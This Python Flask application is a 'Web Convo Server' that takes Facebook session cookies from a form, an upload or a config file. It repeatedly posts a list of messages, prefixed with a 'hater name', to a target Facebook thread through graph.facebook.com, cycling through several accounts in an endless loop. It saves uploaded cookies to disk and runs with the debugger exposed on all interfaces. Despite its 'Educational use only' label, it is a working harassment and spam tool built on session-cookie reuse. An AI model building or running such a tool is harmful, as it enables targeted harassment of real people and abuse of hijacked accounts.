import os
import json
import time
import random
import string
from threading import Thread, Event
from flask import Flask, request, render_template_string, jsonify
import requests

CONFIG_PATH = "config.json"
if not os.path.exists(CONFIG_PATH):
    raise SystemExit("config.json missing. Create it from the example and restart.")

with open(CONFIG_PATH, "r", encoding="utf-8") as cf:
    config = json.load(cf)

SERVER_CFG = config.get("server", {})
COOKIES_CFG = config.get("cookies", {})
TASK_CFG = config.get("message_task", {})
LOG_CFG = config.get("logging", {})

def cookie_string_to_dict(cookie_str):
    cookie_dict = {}
    for part in cookie_str.split(';'):
        part = part.strip()
        if '=' in part:
            k, v = part.split('=', 1)
            cookie_dict[k.strip()] = v.strip()
    return cookie_dict

def parse_cookie_file(path):
    cookies_list = []
    if not os.path.exists(path):
        return cookies_list
    with open(path, "r", encoding="utf-8") as f:
        for raw in f.read().splitlines():
            raw = raw.strip()
            if not raw:
                continue
            cookies_list.append(cookie_string_to_dict(raw))
    return cookies_list

def load_cookies_json(path):
    if not os.path.exists(path):
        return []
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
        if isinstance(data, list):
            return [dict(item) for item in data]
        if isinstance(data, dict):
            return [data]
    return []

def save_cookies_json(cookies_list, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(cookies_list, f, indent=2)

HEADERS = {
   'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Referer': 'https://www.google.com/'
}

stop_events = {}
threads = {}

def send_messages_worker(cookies_list, thread_id, hater_name, interval, messages, task_id, log_responses=False):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            full_msg = (str(hater_name) + " " + msg).strip()
            for cookie in cookies_list:
                api_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                payload = {'message': full_msg}
                try:
                    resp = requests.post(api_url, data=payload, headers=HEADERS, cookies=cookie, timeout=20)
                    status = resp.status_code
                    if log_responses:
                        print(f"[{task_id}] status={status} resp_text={resp.text[:200]}")
                    else:
                        print(f"[{task_id}] status={status} send '{full_msg}' using cookie keys {list(cookie.keys())[:3]}")
                except Exception as e:
                    print(f"[{task_id}] Exception sending: {e}")
                if stop_event.is_set():
                    break
                time.sleep(interval)
    print(f"[{task_id}] stopped.")

def build_cookies_from_config():
    itype = COOKIES_CFG.get("input_type", "single")
    cookies_list = []
    if itype == "single":
        raw = COOKIES_CFG.get("single_cookie", "").strip()
        if raw:
            cookies_list = [cookie_string_to_dict(raw)]
    elif itype == "file":
        path = COOKIES_CFG.get("cookie_file_path", "cookies.txt")
        cookies_list = parse_cookie_file(path)
    elif itype == "json":
        path = COOKIES_CFG.get("cookies_json_path", "cookies.json")
        cookies_list = load_cookies_json(path)
    return cookies_list

def build_messages_from_config():
    msgs = TASK_CFG.get("messages_inline", [])
    file_path = TASK_CFG.get("messages_file")
    if file_path and os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            file_msgs = [line.strip() for line in f.read().splitlines() if line.strip()]
            if file_msgs:
                msgs = file_msgs
    return msgs

app = Flask(__name__)
app.debug = SERVER_CFG.get("debug", True)

HTML_FORM = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Web Convo Server (Config-driven)</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>body{background:#0f0f0f;color:#fff;padding:22px} .card{background:#121212;border-radius:10px}</style>
</head>
<body>
<div class="container">
  <div class="card p-4 mx-auto" style="max-width:680px">
    <h3 class="mb-3 text-center">Web Convo Server (Config-driven)</h3>
    <form method="post" enctype="multipart/form-data">
      <div class="row">
        <div class="col-md-6 mb-2">
          <label>Cookie input type</label>
          <select name="cookieOption" class="form-control">
            <option value="single">single</option>
            <option value="file">file</option>
            <option value="json">json</option>
          </select>
        </div>
        <div class="col-md-6 mb-2">
          <label>Single cookie (c_user=...; xs=...)</label>
          <input name="singleCookie" class="form-control" value="{{ single_cookie }}">
        </div>
      </div>

      <div class="mb-2">
        <label>Cookie file (upload) or cookies.json (upload)</label>
        <input type="file" name="cookieFile" class="form-control">
      </div>

      <div class="mb-2">
        <label>Thread ID (uid/tid)</label>
        <input name="threadId" class="form-control" value="{{ thread_id }}" required>
      </div>

      <div class="mb-2">
        <label>Hater name (prefix)</label>
        <input name="haterName" class="form-control" value="{{ hater_name }}">
      </div>

      <div class="mb-2">
        <label>Interval seconds</label>
        <input name="interval" type="number" class="form-control" value="{{ interval }}">
      </div>

      <div class="mb-2">
        <label>Messages file (upload .txt, one message per line)</label>
        <input type="file" name="messagesFile" class="form-control">
      </div>

      <div class="mb-2">
        <label>Or paste messages (one per line)</label>
        <textarea name="messagesInline" class="form-control" rows="4">{{ messages_inline }}</textarea>
      </div>

      <div class="mb-2">
        <label>Persist uploaded cookies?</label>
        <select name="persistCookies" class="form-control"><option value="no">no</option><option value="yes">yes</option></select>
      </div>

      <button class="btn btn-primary w-100" type="submit">Start Task</button>
    </form>

    <hr />
    <h5>Stop a running task</h5>
    <form method="post" action="/stop" class="mb-3">
      <label>Task ID</label>
      <input name="taskId" class="form-control mb-2">
      <button class="btn btn-danger w-100" type="submit">Stop task</button>
    </form>

    <div class="mt-3 small text-muted">
      Server loaded from config. Educational use only.
    </div>
  </div>
</div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "POST":
        # Build cookies_list from form or uploads
        cookie_option = request.form.get("cookieOption", COOKIES_CFG.get("input_type", "single"))
        cookies_list = []
        if cookie_option == "single":
            raw = request.form.get("singleCookie", "").strip()
            if raw:
                cookies_list = [cookie_string_to_dict(raw)]
        else:
            uploaded = request.files.get("cookieFile")
            if uploaded:
                text = uploaded.read().decode(errors="ignore")
                # try json
                try:
                    parsed = json.loads(text)
                    if isinstance(parsed, list):
                        cookies_list = [dict(x) for x in parsed]
                    elif isinstance(parsed, dict):
                        cookies_list = [parsed]
                    else:
                        cookies_list = []
                except Exception:
                    # treat as lines of cookie strings
                    cookies_list = [cookie_string_to_dict(line) for line in text.splitlines() if line.strip()]

        # Persist?
        if request.form.get("persistCookies", "no").lower() in ("yes","true","1") and cookies_list:
            save_cookies_json(cookies_list, COOKIES_CFG.get("cookies_json_path", "cookies.json"))

        # Thread id and other params
        thread_id = request.form.get("threadId")
        hater_name = request.form.get("haterName", "")
        try:
            interval = int(request.form.get("interval", TASK_CFG.get("time_interval_seconds", 2)))
        except:
            interval = TASK_CFG.get("time_interval_seconds", 2)

        messages = []
        # messages uploaded file?
        mfile = request.files.get("messagesFile")
        if mfile:
            messages = [line.strip() for line in mfile.read().decode(errors="ignore").splitlines() if line.strip()]
        else:
            inline = request.form.get("messagesInline","").strip()
            if inline:
                messages = [line for line in inline.splitlines() if line.strip()]

        if not cookies_list:
            # fallback to config cookies
            cookies_list = build_cookies_from_config()
        if not messages:
            messages = build_messages_from_config()

        if not cookies_list:
            return "No cookies provided (form, uploaded or config).", 400
        if not messages:
            return "No messages provided (upload, inline or config).", 400
        if not thread_id:
            return "threadId is required", 400

        # Start background worker
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        worker = Thread(target=send_messages_worker, args=(cookies_list, thread_id, hater_name, interval, messages, task_id, LOG_CFG.get("print_responses", False)))
        threads[task_id] = worker
        worker.start()
        return f"Task started with ID: {task_id}"

    # GET -> render form with config defaults
    single_cookie = COOKIES_CFG.get("single_cookie", "")
    thread_id = TASK_CFG.get("thread_id", "")
    hater_name = TASK_CFG.get("hater_name", "")
    interval = TASK_CFG.get("time_interval_seconds", 2)
    messages_inline = "\n".join(TASK_CFG.get("messages_inline", []))
    return render_template_string(HTML_FORM, single_cookie=single_cookie, thread_id=thread_id, hater_name=hater_name, interval=interval, messages_inline=messages_inline)

@app.route("/stop", methods=["POST"])
def stop_task():
    task_id = request.form.get("taskId")
    if not task_id:
        return "taskId required", 400
    ev = stop_events.get(task_id)
    if ev:
        ev.set()
        return f"Task {task_id} stopping."
    return f"No task with id {task_id}", 404

@app.route("/api/start", methods=["POST"])
def api_start():
    payload = request.get_json(force=True)
    cookies_list = payload.get("cookies")
    thread_id = payload.get("threadId")
    messages = payload.get("messages")
    hater_name = payload.get("haterName", "")
    interval = int(payload.get("time", TASK_CFG.get("time_interval_seconds", 2)))
    if not (cookies_list and thread_id and messages):
        return jsonify({"error": "cookies, threadId and messages required"}), 400
    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    stop_events[task_id] = Event()
    worker = Thread(target=send_messages_worker, args=(cookies_list, thread_id, hater_name, interval, messages, task_id, LOG_CFG.get("print_responses", False)))
    threads[task_id] = worker
    worker.start()
    return jsonify({"task_id": task_id, "status": "started"})

def maybe_autostart():
    if SERVER_CFG.get("auto_start_task", False) and TASK_CFG.get("run_mode","manual") == "auto":
        cookies = build_cookies_from_config()
        messages = build_messages_from_config()
        thread_id = TASK_CFG.get("thread_id")
        hater_name = TASK_CFG.get("hater_name","")
        interval = TASK_CFG.get("time_interval_seconds", 2)
        if cookies and messages and thread_id:
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            stop_events[task_id] = Event()
            worker = Thread(target=send_messages_worker, args=(cookies, thread_id, hater_name, interval, messages, task_id, LOG_CFG.get("print_responses", False)))
            threads[task_id] = worker
            worker.start()
            print("Auto-started task id:", task_id)
        else:
            print("Auto-start requested but config lacks cookies/messages/thread_id.")

if __name__ == "__main__":
    # Try auto-start before running server
    maybe_autostart()
    host = SERVER_CFG.get("host","0.0.0.0")
    port = int(SERVER_CFG.get("port", 5000))
    debug = bool(SERVER_CFG.get("debug", True))
    # If deployed on Render, replace app.run with port from env if needed
    app.run(host=host, port=port, debug=debug)
